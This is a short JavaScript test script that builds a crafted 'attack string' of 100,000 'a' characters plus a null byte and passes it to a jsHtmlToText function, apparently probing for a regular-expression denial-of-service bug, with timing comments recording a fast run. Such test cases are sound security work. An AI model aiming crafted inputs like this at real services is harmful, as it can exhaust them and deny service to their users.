const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"a"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "\u0000";

var result = htmlToText(str, "");

// real    0m0.124s
// user    0m0.083s
// sys     0m0.022s
